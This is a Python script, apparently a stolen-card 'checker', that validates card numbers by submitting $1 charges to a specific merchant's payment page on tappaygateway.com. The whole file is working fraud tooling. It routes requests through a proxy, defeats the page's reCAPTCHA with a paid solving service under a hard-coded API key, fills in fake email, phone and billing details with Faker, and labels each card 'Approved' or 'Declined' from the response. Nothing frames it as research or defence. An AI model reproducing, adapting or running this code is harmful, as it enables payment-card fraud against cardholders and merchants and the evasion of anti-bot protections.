from faker import Faker
import asyncio
import capsolver
from httpx import AsyncClient
import uuid

async def pene(cc,mes,ano,cvv,proxyg):   
    async with AsyncClient(verify=False,follow_redirects=True,proxy=proxyg) as web:
        capsolver.api_key = "CAP-19CE2290C6A6349E52AE1488B65DCCB7"
                
        g_response = (await asyncio.to_thread(lambda: capsolver.solve({
        "type": "ReCaptchaV2TaskProxyLess",
        "websiteKey": '6LeDxZwpAAAAAM8huWYzvoKay-WM4B-1JzvM9s_A',
        "websiteURL": 'https://pay.tappaygateway.com/radiomankato',
        })))['gRecaptchaResponse']

        email = f"{uuid.uuid4()}@gmail.com"
        fake = Faker()

        headers = {
            'accept': '*/*',
            'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
            'cache-control': 'no-cache',
            'content-type': 'application/json',
            'origin': 'https://pay.tappaygateway.com',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://pay.tappaygateway.com/radiomankato',
            'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        }

        json_data = {
            'generalInfo': {
                'subtotal': 1,
                'description': '1',
                'company': 'N/A',
                'invoice': '1',
                'email': email,
                'phone': fake.phone_number(),
                'amount': 1,
                'surcharge': 0,
                'tax': 0,
                'cardholderName': 'sad',
                'expiryMonth': mes,
                'expiryYear': ano,
                'cvv2': '',
                'expir': mes+ano,
                'card': cc,
            },
            'customFields': {
                'custom3': '1',
                'custom2': '1',
            },
            'billingInfo': {
                'billingStreet': fake.street_address(),
                'billingState': fake.state(),
                'billingZipCode': fake.zipcode(),
            },
            'shippingInfo': {},
            'recurringInfo': None,
            'paymentPage': {
                'slug': 'SMCOB',
                'isoWebsite': 'https://tappaysolutions.com',
            },
            'recaptchaToken': g_response,
            'totalAmount': 1,
        }

        req1 = await web.post('https://pay.tappaygateway.com/merchant/api/merchant/process-payment-page/radiomankato',headers=headers,json=json_data,)
        print(req1.text)
        if "Approved" in req1.text:
            status = "Approved ✅"
            mensaje = "Charged $1.00"
        else:
            mensaje = req1.json()['message']
            if "Funds" in mensaje:
                status = "Approved ✅"
            else:
                status = "Declined ❌"
        
        await web.aclose()
        
        return status,mensaje